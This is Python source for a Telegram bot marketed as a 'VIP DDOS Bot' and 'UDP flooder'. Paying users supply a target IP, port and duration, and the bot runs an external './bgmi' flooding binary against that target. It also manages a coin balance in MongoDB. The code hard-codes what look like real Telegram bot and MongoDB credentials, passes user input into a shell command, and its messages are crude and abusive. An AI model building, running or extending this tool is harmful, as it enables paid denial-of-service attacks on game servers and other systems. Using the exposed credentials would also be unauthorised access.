import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None  # Store details of the current attack
attack_history = []  # Store attack logs

TELEGRAM_BOT_TOKEN = '8042326539:AAH4CdJsBrO9BM72u86Pv2v7u35ttokyqMs'  # Replace with your bot token
ADMIN_USER_ID = 5486683891
MONGO_URI = "mongodb+srv://golem:golempapa123@golem.ijr3g.mongodb.net/?retryWrites=true&w=majority&appName=golem"
DB_NAME = "golem"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO  ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🏦 *𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo*\n"
        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
        "*Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: *"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def golem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /golem <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins diye gaye. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins kaat diye. Balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time, bot_start_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- *",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. Attack khatam hone mein {int(remaining_time)} seconds bache hain.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Usage galat hai! Command ka sahi format yeh hai:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ YE PORT WRONG HAI SAHI PORT DALO AUR NAHI PATA TOH YE VIDEO DEKHO ❌*"
            ),
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo! Tum sirf {ATTACK_TIME_LIMIT} seconds tak attack kar sakte ho.*\n"
                "*Agar zyada duration chahiye toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 Attack chal raha hai! Chill kar aur enjoy kar! 💥*"
        ),
        parse_mode='Markdown'
    )

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True

    try:
        command = f"./bgmi {ip} {port} {duration} {400}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack complete! Ab chill kar aur feedback bhej! 🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)

    balance = user["coins"]
    message = (
        f"*📝 Tera info check kar le, Gandu hacker:*\n"
        f"*💰 Coins: {balance}*\n"
        f"*😏 Status: Approved*\n"
        f"*Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️  VIP DDOS Bot Help Menu 🛠️*\n\n"
        "🌟 *Yahan hai sab kuch jo tumhe chahiye!* 🌟\n\n"
        "📜 *Available Commands:* 📜\n\n"
        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
        "   - *Example: /attack 192.168.1.1 20876 240*\n"
        "   - *📝 Note: Duration 240 seconds se zyada nahi ho sakta.*\n\n"
        "2️⃣ *💳 /myinfo*\n"
        "   - *Apne account ka status aur coins check karne ke liye.*\n"
        "   - *Example: Tumhare balance aur approval status ka pura details milega.*\n\n"
        "3️⃣ *🔧 /uptime*\n"
        "   - *Bot ka uptime check karo aur dekho bot kitne der se chal raha hai.*\n\n"
        "4️⃣ *👤 /users*\n"
        "   - *Kitne users is bot per added hai dekh lijiye sir ji ADMIN.*\n\n"
        "4️⃣ *👤 /remove*\n"
        "   - *users ko bot se nikalna hai ADMIN ji.*\n\n"
        "5️⃣ *❓ /help*\n"
        "   - *Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.*\n\n"
        "🚨 *𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬:* 🚨\n"
        "- *BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.*\n"
        "- *Agar koi dikkat aaye toh admin ko contact karo: *\n\n"
        "💥 *Ab jao aur hacker banne ka natak shuru karo!* 💥"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def users(update: Update, context: CallbackContext):
    """Display all users and their data, only for the admin."""
    chat_id = update.effective_chat.id

    # Only allow the admin to run this command
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*🖕 Chal nikal Chakke! Teri aukaat nahi hai yeh command chalane ki chmod wale NOOB.*",
            parse_mode='Markdown'
        )
        return

    # Fetch all users from MongoDB
    users_cursor = users_collection.find()
    user_data = await users_cursor.to_list(length=None)

    if not user_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ No users found in the database.*",
            parse_mode='Markdown'
        )
        return

    # Send the user data in a formatted message
    message = "*📊 List of all users in the database: 📊*\n\n"
    for user in user_data:
        # Check if 'user_id' and 'coins' keys are present
        user_id = user.get('user_id', 'N/A')  # Default to 'N/A' if 'user_id' is missing
        coins = user.get('coins', 'N/A')  # Default to 'N/A' if 'coins' is missing
        message += f"**User ID:** {user_id}  |  **Coins:** {coins}\n"

    # Send the message to the admin
    await context.bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    """Remove a user from the database, only for the admin."""
    chat_id = update.effective_chat.id

    # Only allow the admin to run this command
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*🖕 Chal nikal! Teri aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Remove the user from the database
    result = await users_collection.delete_one({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko nikal diya h malik.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} ye chutiya is bot m nhi h malik.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("golem", golem))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("remove", remove_user))  # Add the new /remove command handler
    application.run_polling()

if __name__ == '__main__':
    main()
